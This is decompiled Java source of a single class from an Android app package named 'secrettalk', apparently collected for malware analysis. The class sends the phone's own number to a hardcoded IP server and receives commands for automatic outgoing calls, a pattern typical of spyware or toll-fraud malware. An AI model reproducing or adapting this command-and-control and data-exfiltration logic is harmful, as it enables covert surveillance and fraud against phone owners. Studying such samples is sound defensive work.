package com.android.secrettalk;

import android.os.AsyncTask;
import android.os.Handler;
import com.google.gson.JsonObject;
import java.net.URI;
import org.json.JSONException;
import org.json.JSONObject;

class ReceiverRegisterService$3
  extends AsyncTask<Void, Void, Void>
{
  ReceiverRegisterService$3(ReceiverRegisterService paramReceiverRegisterService) {}
  
  protected Void doInBackground(Void... paramVarArgs)
  {
    JsonObject localJsonObject = new JsonObject();
    localJsonObject.addProperty("phone_id", GlobalData.my_phonenumber);
    localJsonObject.addProperty("_id", GlobalData.call_id);
    String str = HttpManager.postHttpResponse(URI.create("http://61.33.28.196/secrettalk.server/api/api.php?mName=autoCallInformation&format=json"), localJsonObject.toString());
    try
    {
      JSONObject localJSONObject = new JSONObject(str);
      GlobalData.Call_State = localJSONObject.getInt("auto_call_state");
      if (GlobalData.Call_State == 0)
      {
        this.this$0.pollingNextCallRequest();
      }
      else
      {
        GlobalData.auto_call_number = localJSONObject.getString("call_num");
        GlobalData.call_span = localJSONObject.getInt("call_span");
        GlobalData.call_time = localJSONObject.getInt("call_time");
        GlobalData.call_id = localJSONObject.getString("_id");
        ReceiverRegisterService.access$1(this.this$0).sendEmptyMessage(5000);
      }
    }
    catch (JSONException localJSONException)
    {
      this.this$0.pollingNextCallRequest();
      localJSONException.printStackTrace();
    }
    return null;
  }
}


/* Location:           D:\Workspaces\SsSDK\contest_dev\Manal\Manal-plugin\tools\decompiler\tools\classes-dex2jar.jar
 * Qualified Name:     com.android.secrettalk.ReceiverRegisterService.3
 * JD-Core Version:    0.7.0.1
 */